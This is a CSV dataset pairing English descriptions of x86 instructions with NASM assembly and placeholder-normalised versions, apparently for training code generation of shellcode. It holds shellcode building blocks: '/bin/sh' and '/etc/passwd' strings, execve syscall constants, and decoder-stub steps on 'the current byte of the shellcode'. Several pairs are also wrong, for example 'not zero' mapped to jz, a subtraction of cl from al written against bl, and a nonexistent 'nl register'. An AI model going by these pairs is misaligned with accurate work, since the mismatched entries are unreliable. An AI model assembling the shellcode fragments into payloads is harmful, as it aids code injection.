multiply edx by 2 using left shift,multiply var0 2 using left shift,"shl edx , 1","shl var0 , 1"
left shift the contents of the edx register by 24 bits,left shift contents var0 register 24 bits,"shl edx , 24","shl var0 , 24"
left shift the contents of edx register by 9 bit positions,left shift contents var0 register 9 bit positions,"shl edx , 9","shl var0 , 9"
left shift the contents of the edx register by 9 bits,left shift contents var0 register 9 bits,"shl edx , 9","shl var0 , 9"
left shift the contents of the esi register by 0x1 bit,left shift contents var0 register var1 bit,"shl esi , 0x1","shl var0 , var1"
right shift by 3 bit positions the contents of var variable,right shift 3 bit positions contents var variable,"shr [var] , 3","shr [var] , 3"
shift right ax by the contents of bl and negate the word in ax,shift right ax contents var0 and negate word ax,"shr ax , bl \n not word ax","shr ax , var0 \n not word ax"
right shift by 4 bits bl,right shift 4 bits var0,"shr bl , 4","shr var0 , 4"
shift right bx by the contents of cl and negate the contents of bx,shift right var0 contents cl and negate contents var0,"shr bx , cl \n not bx","shr var0 , cl \n not var0"
shift right bx by the contents of dl and negate the byte in bx,shift right var0 contents dl and negate byte var0,"shr bx , dl \n not byte bl","shr var0 , dl \n not byte bl"
shift right cx by the contents of al and negate the contents of cx,shift right cx contents al and negate contents cx,"shr cx , al \n not cx","shr cx , al \n not cx"
right shift the contents of the dl register by 1 bit,right shift contents dl register 1 bit,"shr dl , 1","shr dl , 1"
divide eax by 2 using right shift,divide var0 2 using right shift,"shr eax , 1","shr var0 , 1"
right shift the contents of eax register by 16 bit positions,right shift contents var0 register 16 bit positions,"shr eax , 16","shr var0 , 16"
divide eax by 4 using right shift,divide var0 4 using right shift,"shr eax , 2","shr var0 , 2"
divide ebx by 2 using right shift,divide var0 2 using right shift,"shr ebx , 1","shr var0 , 1"
divide ebx by 4 using right shift,divide var0 4 using right shift,"shr ebx , 2","shr var0 , 2"
divide ecx by 2 using right shift,divide var0 2 using right shift,"shr ecx , 1","shr var0 , 1"
divide ecx by 4 using right shift,divide var0 4 using right shift,"shr ecx , 2","shr var0 , 2"
divide edx by 2 using right shift,divide var0 2 using right shift,"shr edx , 1","shr var0 , 1"
right shift the contents of the edx register by 16,right shift contents var0 register 16,"shr edx , 16","shr var0 , 16"
divide edx by 4 using right shift,divide var0 4 using right shift,"shr edx , 2","shr var0 , 2"
right shift the contents of the edx register by the byte 16,right shift contents var0 register byte 16,"shr edx , byte 16","shr var0 , byte 16"
right shift the contents of the edx register by the byte 24,right shift contents var0 register byte 24,"shr edx , byte 24","shr var0 , byte 24"
define size to be 1024 bytes large,define size be 1024 bytes large,size : equ 1024,size : equ 1024
declare a constant size and set equal to 50000,declare constant size and set equal 50000,size : equ 50000,size : equ 50000
declare the stage label,declare stage label,stage :,stage :
declare the start label,declare start label,start :,start :
set carry flag,set carry flag,stc,stc
declare 6 bytes starting at the address str initialized to the ascii character values for hello and the null byte,declare 6 bytes starting address var0 initialized ascii character values var1 hello and null byte,"str db 'hello' , 0","var0 db ""hello"" , 0"
declare 4 bytes starting at the address str initialized to the ascii character values for the string 'hey' and 0 respectively,declare 4 bytes starting address var0 initialized ascii character values var1 string var2 and 0 respectively,"str db 'hey' , 0","var0 db var2 , 0"
define string as the byte string 'test.txt',define string byte string var0,string db 'test . txt',string db 'test . txt'
define string as the byte string '/bin/sh',define string byte string var0,string : db '/bin/sh',string : db var0
define string as the byte string '/etc/passwd',define string byte string var0,string : db '/etc/passwd',string : db var0
define string as the byte string 'file.txt',define string byte string var0,string : db 'file . txt',string : db 'file . txt'
define string as the byte string 'file1.txt',define string byte string var0,string : db 'file1 . txt',string : db 'file1 . txt'
define string as the byte string 'prova.txt',define string byte string var0,string : db 'prova . txt',string : db 'prova . txt'
define string as the byte string 'tmp.txt',define string byte string var0,string : db 'tmp . txt',string : db 'tmp . txt'
subtract the contents of esi from the 32-bit integer stored at memory location var,subtract contents var0 var1 integer stored memory location var,"sub [var] , esi","sub [var] , var0"
subtract the contents of esi from the 32-bit integer stored at memory location var2,subtract contents var0 var1 integer stored memory location var2,"sub [var2] , esi","sub [var2] , var0"
subtract 0x13 from the al register,subtract var0 al register,"sub al , 0x13","sub al , var0"
subtract 0x41 from the al register,subtract var0 al register,"sub al , 0x41","sub al , var0"
subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative,subtract value 1 contents al register and jump var0 label if result not negative,"sub al , 1 \n jns l1","sub al , 1 \n jns var0"
subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero,subtract value 1 contents al register and jump var0 label if result not zero,"sub al , 1 \n jnz l1","sub al , 1 \n jnz var0"
subtract 88 from the contents of al register and save the result in al,subtract 88 contents al register and save result al,"sub al , 88","sub al , 88"
subtract 88 from the contents of the al register,subtract 88 contents al register,"sub al , 88","sub al , 88"
subtract ah from al,subtract var0 al,"sub al , ah","sub al , var0"
subtract 1564 from ax and save the result into ax,subtract 1564 ax and save result ax,"sub ax , 1564","sub ax , 1564"
subtract 1564 from the contents of ax register and save the result in ax,subtract 1564 contents ax register and save result ax,"sub ax , 1564","sub ax , 1564"
subtract 1662 from ax and save the result into ax,subtract 1662 ax and save result ax,"sub ax , 1662","sub ax , 1662"
subtract 1662 from the contents of ax register and save the result in ax,subtract 1662 contents ax register and save result ax,"sub ax , 1662","sub ax , 1662"
subtract the contents of the ax register by 1662,subtract contents ax register 1662,"sub ax , 1662","sub ax , 1662"
subtract the contents of ax from the contents of ax,subtract contents ax contents ax,"sub ax , ax","sub ax , ax"
subtract 0x7 from bl and save the result into bl,subtract var0 var1 and save result var1,"sub bl , 0x7","sub var1 , var0"
subtract 0x7 from the contents in bl and save the result in bl,subtract var0 contents var1 and save result var1,"sub bl , 0x7","sub var1 , var0"
subtract 3 from the contents of the bl register,subtract 3 contents var0 register,"sub bl , 3","sub var0 , 3"
subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero,subtract value 3 contents var0 register and jump stage label if result not zero,"sub bl , 3 \n jnz stage","sub var0 , 3 \n jnz stage"
subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative,subtract value 4 contents var0 register and jump var1 label if result not negative,"sub bl , 4 \n jns l2","sub var0 , 4 \n jns var1"
subtract the decimal value 48 from the nl register,subtract decimal value 48 var0 register,"sub bl , 48","sub bl , 48"
subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero,subtract contents cl register contents al register and jump var0 label if result not zero,"sub bl , cl \n jnz l2","sub bl , cl \n jnz var0"
subtract the byte in esi from the bl register,subtract byte var0 var1 register,"sub bl , byte [esi]","sub var1 , byte [var0]"
subtract 1634 from bx and save the result into bx,subtract 1634 var0 and save result var0,"sub bx , 1634","sub var0 , 1634"
subtract 1634 from the contents of bx register and save the result in bx,subtract 1634 contents var0 register and save result var0,"sub bx , 1634","sub var0 , 1634"
subtract 1634 from the contents of the bx register,subtract 1634 contents var0 register,"sub bx , 1634","sub var0 , 1634"
subtract 1663 from bx and save the result into bx,subtract 1663 var0 and save result var0,"sub bx , 1663","sub var0 , 1663"
subtract 1663 from the contents of the bx register,subtract 1663 contents var0 register,"sub bx , 1663","sub var0 , 1663"
subtract the contents of bx register by 1663 and save the result in bx,subtract contents var0 register 1663 and save result var0,"sub bx , 1663","sub var0 , 1663"
subtract the contents of bx from the contents of bx,subtract contents var0 contents var0,"sub bx , bx","sub var0 , var0"
subtract the contents of the dx register from the contents of the bx register,subtract contents var0 register contents var1 register,"sub bx , dx","sub var1 , var0"
subtract 20h from the 8-bit at memory location buff,subtract var0 var1 memory location buff,"sub byte [buff] , 20h","sub byte [buff] , var0"
subtract 20h from the 8-bit at memory location ebp+ecx,subtract var0 var1 memory location ebp+ecx,"sub byte [ebp+ecx] , 20h","sub byte [var2] , var0"
subtract 0x4 from the byte at the address edi and negate the result,subtract var0 byte address var1 and negate result,"sub byte [edi] , 0x4 \n not byte [edi]","sub byte [var1] , var0 \n not byte [var1]"
negate the byte at the address edi after subtracting the value 7,negate byte address var0 after subtracting value 7,"sub byte [edi] , 7 \n not byte [edi]","sub byte [var0] , 7 \n not byte [var0]"
subtract the value 8 from the byte in edi and negate it,subtract value 8 byte var0 and negate it,"sub byte [edi] , 8 \n not byte [edi]","sub byte [var0] , 8 \n not byte [var0]"
subtract 0x1 from the current byte of the shellcode and negate the result,subtract var0 current byte shellcode and negate result,"sub byte [esi] , 0x1 \n not byte [esi]","sub byte [esi] , var0 \n not byte [esi]"
subtract 0x1 from the byte at the address esi and negate the result,subtract var0 byte address var1 and negate result,"sub byte [esi] , 0x1 \n not byte [esi]","sub byte [var1] , var0 \n not byte [var1]"
subtract the value 0x9 from the current byte of the shellcode and then negate the result,subtract value var0 current byte shellcode and then negate result,"sub byte [esi] , 0x9 \n not byte [esi]","sub byte [esi] , var0 \n not byte [esi]"
subtract 0xd from the byte at the address esi,subtract var0 byte address var1,"sub byte [esi] , 0xd","sub byte [var1] , var0"
subtract 13 from the byte at the address esi,subtract 13 byte address var0,"sub byte [esi] , 13","sub byte [var0] , 13"
subtract 13 from the byte in esi and save the result in esi,subtract 13 byte var0 and save result var0,"sub byte [esi] , 13","sub byte [var0] , 13"
negate the byte at the address esi after subtracting the value 2,negate byte address var0 after subtracting value 2,"sub byte [esi] , 2 \n not byte [esi]","sub byte [var0] , 2 \n not byte [var0]"
subtract 1 from the contents of the cl register,subtract 1 contents cl register,"sub cl , 1","sub cl , 1"
subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative,subtract contents var0 register contents cl register and jump var1 label if result not negative,"sub cl , bl \n jns l3","sub cl , var0 \n jns var1"
subtract 0x7ff from the contents in cx and save the result in cx,subtract var0 contents cx and save result cx,"sub cx , 0x7ff","sub cx , var0"
subtract 0x7ff from the contents of cx register value and save the result in cx,subtract var0 contents cx register value and save result cx,"sub cx , 0x7ff","sub cx , var0"
subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative,subtract value 5 contents dl register and jump var0 label if result not negative,"sub dl , 5 \n jns l4","sub dl , 5 \n jns var0"
subtract the contents of al register from the contents of dl register and save the result in dl,subtract contents al register contents dl register and save result dl,"sub dl , al","sub dl , al"
subtract the byte at the address esi from the contents of the dl register,subtract byte address var0 contents dl register,"sub dl , byte [esi]","sub dl , byte [var0]"
subtract 15444 from dx and save the result into dx,subtract 15444 var0 and save result var0,"sub dx , 15444","sub var0 , 15444"
subtract 15444 from the contents of the dx register,subtract 15444 contents var0 register,"sub dx , 15444","sub var0 , 15444"
subtract the value of the memory at address esp from eax and store into eax,subtract value memory address esp var0 and store var0,"sub eax , [esp]","sub var0 , [esp]"
subtract 0x013ffeff from the contents in eax and save the result in eax,subtract var0 contents var1 and save result var1,"sub eax , 0x013ffeff","sub var1 , var0"
subtract 0x04feca01 from the contents in eax and save the result in eax,subtract var0 contents var1 and save result var1,"sub eax , 0x04feca01","sub var1 , var0"
subtract 0x0efc3532 from the contents in eax and save the result in eax,subtract var0 contents var1 and save result var1,"sub eax , 0x0efc3532","sub var1 , var0"
subtract 0x2c3d2dff from the contents in eax and save the result in eax,subtract var0 contents var1 and save result var1,"sub eax , 0x2c3d2dff","sub var1 , var0"
subtract 0x3217d6d2 from the contents in eax and save the result in eax,subtract var0 contents var1 and save result var1,"sub eax , 0x3217d6d2","sub var1 , var0"
subtract 0x3bd04ede from the contents in eax and save the result in eax,subtract var0 contents var1 and save result var1,"sub eax , 0x3bd04ede","sub var1 , var0"
subtract 0x70445eaf from the contents in eax and save the result in eax,subtract var0 contents var1 and save result var1,"sub eax , 0x70445eaf","sub var1 , var0"
subtract 216 from the value stored in eax,subtract 216 value stored var0,"sub eax , 216","sub var0 , 216"
decrease eax by 3,decrease var0 3,"sub eax , 3","sub var0 , 3"
subtract 3e716230 from the contents of the eax register,subtract var0 contents var1 register,"sub eax , 3e716230","sub var1 , var0"
subtract 5d455523 from the contents of the eax register,subtract var0 contents var1 register,"sub eax , 5d455523","sub var1 , var0"
subtract 5e5d7722 from the contents of the eax register,subtract 5e5d7722 contents var0 register,"sub eax , 5e5d7722","sub var0 , 5e5d7722"
subtract 8 from the contents of eax register and save the result in eax,subtract 8 contents var0 register and save result var0,"sub eax , 8","sub var0 , 8"
subtract 8 from the contents of the eax register,subtract 8 contents var0 register,"sub eax , 8","sub var0 , 8"
subtract the contents of eax from the contents of eax,subtract contents var0 contents var0,"sub eax , eax","sub var0 , var0"
subtract ebx from eax,subtract var0 var1,"sub eax , ebx","sub var1 , var0"
subtract the address in ebx from the address in eax,subtract address var0 address var1,"sub eax , ebx","sub var1 , var0"
subtract 20000h from eax register,subtract var0 var1 register,"sub eax , 20000h","sub var1 , var0"
subtract 0x2e2aa163 from ebx and save the result into ebx,subtract var0 var1 and save result var1,"sub ebx , 0x2e2aa163","sub var1 , var0"
subtract 0x2e2aa163 from the contents in ebx and save the result in ebx,subtract var0 contents var1 and save result var1,"sub ebx , 0x2e2aa163","sub var1 , var0"
decrease ebx by 2,decrease var0 2,"sub ebx , 2","sub var0 , 2"
subtract the byte 3 from the contents of the ebx register,subtract byte 3 contents var0 register,"sub ebx , byte 3","sub var0 , byte 3"
subtract the byte value 3 from the contents of ebx and save the result in ebx,subtract byte value 3 contents var0 and save result var0,"sub ebx , byte 3","sub var0 , byte 3"
subtract the byte 8 from the contents of the ebx register,subtract byte 8 contents var0 register,"sub ebx , byte 8","sub var0 , byte 8"
subtract the byte value 8 from the contents of ebx and save the result in ebx,subtract byte value 8 contents var0 and save result var0,"sub ebx , byte 8","sub var0 , byte 8"
subtract 0x04baca01 from the contents in ecx and save the result in ecx,subtract var0 contents var1 and save result var1,"sub ecx , 0x04baca01","sub var1 , var0"
subtract 0x0b454440 from the contents in ecx and save the result in ecx,subtract var0 contents var1 and save result var1,"sub ecx , 0x0b454440","sub var1 , var0"
subtract 0x1525152a from the contents in ecx and save the result in ecx,subtract var0 contents var1 and save result var1,"sub ecx , 0x1525152a","sub var1 , var0"
subtract 0x6374612e from the contents in ecx and save the result in ecx,subtract var0 contents var1 and save result var1,"sub ecx , 0x6374612e","sub var1 , var0"
decrease ecx by 1,decrease var0 1,"sub ecx , 1","sub var0 , 1"
subtract 23 from the contents of the ecx register,subtract 23 contents var0 register,"sub ecx , 23","sub var0 , 23"
subtract the contents of the ecx register from the contents of the ecx register,subtract contents var0 register contents var0 register,"sub ecx , ecx","sub var0 , var0"
subtract the contents of ecx from the contents of ecx,subtract contents var0 contents var0,"sub ecx , ecx","sub var0 , var0"
subtract ecx from ecx and save the result into ecx,subtract var0 var0 and save result var0,"sub ecx , ecx","sub var0 , var0"
subtract 0x44444444 from edi and save the result in edi,subtract var0 var1 and save result var1,"sub edi , 0x44444444","sub var1 , var0"
subtract 0xffffffdf from edi,subtract var0 var1,"sub edi , 0xffffffdf","sub var1 , var0"
subtract 1768009314 from the contents of the edi register,subtract 1768009314 contents var0 register,"sub edi , 1768009314","sub var0 , 1768009314"
subtract 1768009314 from the edi register and save the result in edi,subtract 1768009314 var0 register and save result var0,"sub edi , 1768009314","sub var0 , 1768009314"
decrease edx by 4,decrease var0 4,"sub edx , 4","sub var0 , 4"
subtract the contents of the edx register from the contents of the edx register,subtract contents var0 register contents var0 register,"sub edx , edx","sub var0 , var0"
subtract 0x24 from the contents in esp and save the result in esp,subtract var0 contents esp and save result esp,"sub esp , 0x24","sub esp , var0"
subtract the value 0x28 from the esp register,subtract value var0 esp register,"sub esp , 0x28","sub esp , var0"
subtract 12 from esp register and save the result in esp,subtract 12 esp register and save result esp,"sub esp , 12","sub esp , 12"
subtract 12 from the contents of the esp register,subtract 12 contents esp register,"sub esp , 12","sub esp , 12"
make room for one 4-byte local variable,make room var0 one var1 local variable,"sub esp , 4","sub esp , 4"
make room on the stack for local variable,make room stack var0 local variable,"sub esp , 4","sub esp , 4"
allocate memory for local variables,allocate memory var0 local variables,"sub esp , 4","sub esp , 4"
subtract the value 4 from the esp register and save the result in esp,subtract value 4 esp register and save result esp,"sub esp , 4","sub esp , 4"
allocate space on the stack for local variable,allocate space stack var0 local variable,"sub esp , 4","sub esp , 4"
make space on stack,make space stack,"sub esp , 4","sub esp , 4"
allocate memory for a variable,allocate memory var0 variable,"sub esp , 4","sub esp , 4"
subtract 8 from esp and save the result in esp,subtract 8 esp and save result esp,"sub esp , 8","sub esp , 8"
subtract the byte 0x1 from the contents of the esp register,subtract byte var0 contents esp register,"sub esp , byte 0x1","sub esp , byte var0"
define sys_execve equal to 0x0b,define var0 equal var1,sys_execve equ 0x0b,var0 equ var1
define syscall_execve equal to 11,define var0 equal 11,syscall_execve equ 11,var0 equ 11
test the value of the al register,test value al register,"test al , al","test al , al"
jump to the label found if the contents of the al register is zero else increment the contents of the ecx register,jump label found if contents al register zero else increment contents var0 register,"test al , al \n jz found \n inc ecx","test al , al \n jz found \n inc var0"
if the contents of the al register is zero then jump to the label found else increment the contents of the ecx register,if contents al register zero then jump label found else increment contents var0 register,"test al , al \n jz found \n inc ecx","test al , al \n jz found \n inc var0"
perform a bitwise and of the contents of ax and the contents of ax,perform var0 and contents ax and contents ax,"test ax , ax","test ax , ax"
jump to the label exeunt if the contents of the ax register is not zero else jump to the label carryon,jump label var0 if contents ax register not zero else jump label var1,"test ax , ax \n jnz exeunt \n jmp carryon","test ax , ax \n jnz var0 \n jmp var1"
if the contents of the ax register is not zero then jump to the label exeunt else jump to the label carryon,if contents ax register not zero then jump label var0 else jump label var1,"test ax , ax \n jnz exeunt \n jmp carryon","test ax , ax \n jnz var0 \n jmp var1"
jump to the label not_found if the contents of the bl register is not zero,jump label var0 if contents var1 register not zero,"test bl , bl \n jz not_found","test var1 , var1 \n jz var0"
if the contents of the bl register is not zero then jump to the label not_found,if contents var0 register not zero then jump label var1,"test bl , bl \n jz not_found","test var0 , var0 \n jz var1"
test the value of cl,test value cl,"test cl , cl","test cl , cl"
jump to the label ready_to_proxy if the contents of the dl register is not zero,jump label var0 if contents dl register not zero,"test dl , 0x1 \n jnz ready_to_proxy","test dl , 0x1 \n jnz var0"
if the contents of the dl register is not zero then jump to the label ready_to_proxy,if contents dl register not zero then jump label var0,"test dl , 0x1 \n jnz ready_to_proxy","test dl , 0x1 \n jnz var0"
perform a bitwise and on the contents of the eax register,perform var0 and contents var1 register,"test eax , eax","test var1 , var1"
test the value of eax,test value var0,"test eax , eax","test var0 , var0"
jump to the label _convert if the contents of the eax register is not zero,jump label _convert if contents var0 register not zero,"test eax , eax \n jnz _convert","test var0 , var0 \n jnz _convert"
if the contents of the eax register is not zero then jump to the label _convert,if contents var0 register not zero then jump label _convert,"test eax , eax \n jnz _convert","test var0 , var0 \n jnz _convert"
jump to the label _parent if the contents of the eax register is not zero else restore the top of the stack into the ecx register,jump label var0 if contents var1 register not zero else restore top stack var2 register,"test eax , eax \n jnz _parent \n pop ecx","test var1 , var1 \n jnz var0 \n pop var2"
if the contents of the eax register is not zero then jump to the label _parent else restore the top of the stack into the ecx register,if contents var0 register not zero then jump label var1 else restore top stack var2 register,"test eax , eax \n jnz _parent \n pop ecx","test var0 , var0 \n jnz var1 \n pop var2"
jump to the label _recv_http_request if the contents of the eax register is not zero else subtract the value 0x6 from the contents of the ecx register,jump label var0 if contents var1 register not zero else subtract value var2 contents var3 register,"test eax , eax \n jnz _recv_http_request \n sub ecx , 0x6","test var1 , var1 \n jnz var0 \n sub var3 , var2"
if the contents of the eax register is not zero then jump to the label _recv_http_request else subtract the value 0x6 from the contents of the ecx register,if contents var0 register not zero then jump label _recv_http_request else subtract value var1 contents var2 register,"test eax , eax \n jnz _recv_http_request \n sub ecx , 0x6","test var0 , var0 \n jnz _recv_http_request \n sub var2 , var1"
jump to the label checkforfile if the contents of the eax register is not zero,jump label var0 if contents var1 register not zero,"test eax , eax \n jnz checkforfile","test var1 , var1 \n jnz var0"
if the contents of the eax register is not zero then jump to the label checkforfile,if contents var0 register not zero then jump label var1,"test eax , eax \n jnz checkforfile","test var0 , var0 \n jnz var1"
jump to the label do_next_accept if the contents of the eax register is not zero,jump label var0 if contents var1 register not zero,"test eax , eax \n jnz do_next_accept","test var1 , var1 \n jnz var0"
if the contents of the eax register is not zero then jump to the label do_next_accept,if contents var0 register not zero then jump label var1,"test eax , eax \n jnz do_next_accept","test var0 , var0 \n jnz var1"
jump to the label exit_on_error if the contents of the eax register is not zero,jump label var0 if contents var1 register not zero,"test eax , eax \n jnz exit_on_error","test var1 , var1 \n jnz var0"
if the contents of the eax register is not zero then jump to the label exit_on_error,if contents var0 register not zero then jump label var1,"test eax , eax \n jnz exit_on_error","test var0 , var0 \n jnz var1"
jump to the label l1 if the contents of the eax register is not zero,jump label var0 if contents var1 register not zero,"test eax , eax \n jnz l1","test var1 , var1 \n jnz var0"
if the contents of the eax register is not zero then jump to the label l1,if contents var0 register not zero then jump label var1,"test eax , eax \n jnz l1","test var0 , var0 \n jnz var1"
jump to the label l1 if the contents of the eax register is not zero else call the function myfunct,jump label var0 if contents var1 register not zero else call function var2,"test eax , eax \n jnz l1 \n call myfunct","test var1 , var1 \n jnz var0 \n call var2"
if the contents of the eax register is not zero then jump to the label l1 else call the function myfunct,if contents var0 register not zero then jump label var1 else call function var2,"test eax , eax \n jnz l1 \n call myfunct","test var0 , var0 \n jnz var1 \n call var2"
jump to the label l4 if the contents of the eax register is not zero else call the function search,jump label var0 if contents var1 register not zero else call function search,"test eax , eax \n jnz l4 \n call search","test var1 , var1 \n jnz var0 \n call search"
if the contents of the eax register is not zero then jump to the label l4 else call the function search,if contents var0 register not zero then jump label var1 else call function search,"test eax , eax \n jnz l4 \n call search","test var0 , var0 \n jnz var1 \n call search"
jump short to the label _parent if the contents of the eax register is not zero,jump short label var0 if contents var1 register not zero,"test eax , eax \n jnz short _parent","test var1 , var1 \n jnz short var0"
if the contents of the eax register is not zero then jump short to the label _parent,if contents var0 register not zero then jump short label var1,"test eax , eax \n jnz short _parent","test var0 , var0 \n jnz short var1"
jump to the label _while_loop if the contents of the eax register is negative,jump label var0 if contents var1 register negative,"test eax , eax \n js _while_loop","test var1 , var1 \n js var0"
if the contents of the eax register is negative then jump to the label _while_loop,if contents var0 register negative then jump label var1,"test eax , eax \n js _while_loop","test var0 , var0 \n js var1"
jump to the label close if the contents of the eax register is negative,jump label close if contents var0 register negative,"test eax , eax \n js close","test var0 , var0 \n js close"
if the contents of the eax register is negative then jump to the label close,if contents var0 register negative then jump label close,"test eax , eax \n js close","test var0 , var0 \n js close"
jump to the label old_dirent if the contents of the eax register is negative,jump label var0 if contents var1 register negative,"test eax , eax \n js old_dirent","test var1 , var1 \n js var0"
if the contents of the eax register is negative then jump to the label old_dirent,if contents var0 register negative then jump label var1,"test eax , eax \n js old_dirent","test var0 , var0 \n js var1"
jump short to the label socket if the contents of the eax register is negative,jump short label socket if contents var0 register negative,"test eax , eax \n js short socket","test var0 , var0 \n js short socket"
if the contents of the eax register is negative then jump short to the label socket,if contents var0 register negative then jump short label socket,"test eax , eax \n js short socket","test var0 , var0 \n js short socket"
jump to the label check_html if the contents of the eax register is zero,jump label var0 if contents var1 register zero,"test eax , eax \n jz check_html","test var1 , var1 \n jz var0"
if the contents of the eax register is zero then jump to the label check_html,if contents var0 register zero then jump label var1,"test eax , eax \n jz check_html","test var0 , var0 \n jz var1"
jump to the label check_html if the contents of the eax register is zero else jump to the while label,jump label var0 if contents var1 register zero else jump while label,"test eax , eax \n jz check_html \n jmp while","test var1 , var1 \n jz var0 \n jmp while"
if the contents of the eax register is zero then jump to the label check_html else jump to the while label,if contents var0 register zero then jump label var1 else jump while label,"test eax , eax \n jz check_html \n jmp while","test var0 , var0 \n jz var1 \n jmp while"
jump to the label close if the contents of the eax register is zero,jump label close if contents var0 register zero,"test eax , eax \n jz close","test var0 , var0 \n jz close"
if the contents of the eax register is zero then jump to the label close,if contents var0 register zero then jump label close,"test eax , eax \n jz close","test var0 , var0 \n jz close"
jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register,jump label close if contents var0 register zero else move contents var1 register var2 register,"test eax , eax \n jz close \n mov ebx , edx","test var0 , var0 \n jz close \n mov var2 , var1"
if the contents of the eax register is zero then jump to the label close else move the contents of the edx register into the ebx register,if contents var0 register zero then jump label close else move contents var1 register var2 register,"test eax , eax \n jz close \n mov ebx , edx","test var0 , var0 \n jz close \n mov var2 , var1"
jump to the label proc_name if the contents of the eax register is zero,jump label var0 if contents var1 register zero,"test eax , eax \n jz proc_name","test var1 , var1 \n jz var0"
if the contents of the eax register is zero then jump to the label proc_name,if contents var0 register zero then jump label var1,"test eax , eax \n jz proc_name","test var0 , var0 \n jz var1"
jump to the label ready_to_proxy if the contents of the eax register is zero,jump label var0 if contents var1 register zero,"test eax , eax \n jz ready_to_proxy","test var1 , var1 \n jz var0"
if the contents of the eax register is zero then jump to the label ready_to_proxy,if contents var0 register zero then jump label var1,"test eax , eax \n jz ready_to_proxy","test var0 , var0 \n jz var1"
jump short to the memory location loc_402B13 if the contents of the eax register is zero,jump short memory location var0 if contents var1 register zero,"test eax , eax \n jz short loc_402B13","test var1 , var1 \n jz short var0"
if the contents of the eax register is zero then jump short to the memory location loc_402B13,if contents var0 register zero then jump short memory location var1,"test eax , eax \n jz short loc_402B13","test var0 , var0 \n jz short var1"
jump short to the memory location loc_402C13 if the contents of the eax register is zero,jump short memory location var0 if contents var1 register zero,"test eax , eax \n jz short loc_402C13","test var1 , var1 \n jz short var0"
if the contents of the eax register is zero then jump short to the memory location loc_402C13,if contents var0 register zero then jump short memory location var1,"test eax , eax \n jz short loc_402C13","test var0 , var0 \n jz short var1"
jump to the label socket if the contents of the eax register is zero,jump label socket if contents var0 register zero,"test eax , eax \n jz socket","test var0 , var0 \n jz socket"
jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register,jump label socket if contents var0 register zero else zero out contents var0 register,"test eax , eax \n jz socket \n xor eax , eax","test var0 , var0 \n jz socket \n xor var0 , var0"
if the contents of the eax register is zero then jump to the label socket else zero out the contents of the eax register,if contents var0 register zero then jump label socket else zero out contents var0 register,"test eax , eax \n jz socket \n xor eax , eax","test var0 , var0 \n jz socket \n xor var0 , var0"
"jump to the label write if the contents of the eax register is zero, else zero out the contents of the eax register","jump label write if contents var0 register zero, else zero out contents var0 register","test eax , eax \n jz write \n xor eax , eax","test var0 , var0 \n jz write \n xor var0 , var0"
if the contents of the eax register is zero then jump to the label write else zero out the contents of the eax register,if contents var0 register zero then jump label write else zero out contents var0 register,"test eax , eax \n jz write \n xor eax , eax","test var0 , var0 \n jz write \n xor var0 , var0"
test the contents of the ebx register,test contents var0 register,"test ebx , ebx","test var0 , var0"
test the contents of the ecx register,test contents var0 register,"test ecx , ecx","test var0 , var0"
perform and operation between si and 01h,perform and operation si and 01h,"test si , 01h","test si , 01h"
declare the three label,declare three label,three :,three :
declare the todo label,declare var0 label,todo :,var0 :
define constant total_students equal to 50,define constant var0 equal 50,total_students equ 50,var0 equ 50
define two label,define two label,two :,two :
declare the two label,declare two label,two :,two :
declare the up label,declare up label,up :,up :
declare var byte variable and initialize it to 32,declare var byte variable and initialize it 32,var db 32,var db 32
declare a byte containing the value 64 at label the memory location var,declare byte containing value 64 label memory location var,var db 64,var db 64
allocate one byte of memory for var_a variable and initialize it to 232,allocate one byte memory var0 var1 variable and initialize it 232,var_a db 232,var1 db 232
create the doubleword variable var_a in memory and initialize it to zero,create doubleword variable var0 memory and initialize it zero,var_a : dd 0x0,var0 : dd 0x0
allocate one byte of memory for var_b variable and initialize it to 'c',allocate one byte memory var0 var1 variable and initialize it var3,var_b db 'c',var1 db var3
declare an uninitialized byte labeled var2,declare var0 byte labeled var1,var2 db ?,var1 db?
declare an uninitialized byte referred to as location var2,declare var0 byte referred location var1,var2 db ?,var1 db?
reserve 1 byte for variableName1,reserve 1 byte var0 var1,variablename1 : resb 1,variablename1 : resb 1
reserve 1 word for variableName2,reserve 1 word var0 var1,variablename2 : resw 1,variablename2 : resw 1
reserve 1 double word for variableName3,reserve 1 double word var0 var1,variablename3 : resd 1,variablename3 : resd 1
declare the array of words word_table initialized to 134 345 564 and 123,declare array words var0 initialized 134 345 564 and 123,"word_table dw 134 , 345 , 564 , 123","var0 dw 134 , 345 , 564 , 123"
define the word value word_value and initialize it to 300,define word value var0 and initialize it 300,word_value dw 300,var0 dw 300
define word1 unsigned word and initialize it to 65535,define var0 unsigned word and initialize it 65535,word1 word 65535,var0 word 65535
define word2 signed word and initialize it to -32768,define var0 signed word and initialize it -32768,word2 sword –32768,var0 sword –32768
define word3 uninitialized unsigned word,define var0 var1 unsigned word,word3 word ?,var0 word?
reserve a word for wordvar,reserve word var0 var1,wordvar : resw 1,var1 : resw 1
declare the wrap_around label,declare var0 label,wrap_around :,var0 :
define write_syscall equal to 4,define var0 equal 4,write_syscall equ 4,var0 equ 4
declare the write label,declare write label,write :,write :
define writestring function,define var0 function,writestring :,var0 :
declare the writestring label,declare var0 label,writestring :,var0 :
declare a word uninitialized value referred to as location x,declare word var0 value referred location x,x dw ?,x dw?
declare an uninitialized word labeled x,declare var0 word labeled x,x dw ?,x dw?
swap the address [ebp+16] with the contents of the ecx register,swap the address [ebp+16] with the contents of the ecx register,"xchg [ebp+16] , ecx","xchg [ebp+16] , ecx"
swap the contents of eax and ebx,swap contents var0 and var1,"xchg eax , ebx","xchg var0 , var1"
swap the contents of the eax register with the contents of the ebx register,swap contents var0 register contents var1 register,"xchg eax , ebx","xchg var0 , var1"
exchange eax with ebx,exchange var0 var1,"xchg eax , ebx","xchg var0 , var1"
swap the contents of the eax register with the contents of the ecx register,swap contents var0 register contents var1 register,"xchg eax , ecx","xchg var0 , var1"
swap the contents of the eax register with the contents of the edx register,swap contents var0 register contents var1 register,"xchg eax , edx","xchg var0 , var1"
swap the contents of eax and esi,swap contents var0 and var1,"xchg eax , esi","xchg var0 , var1"
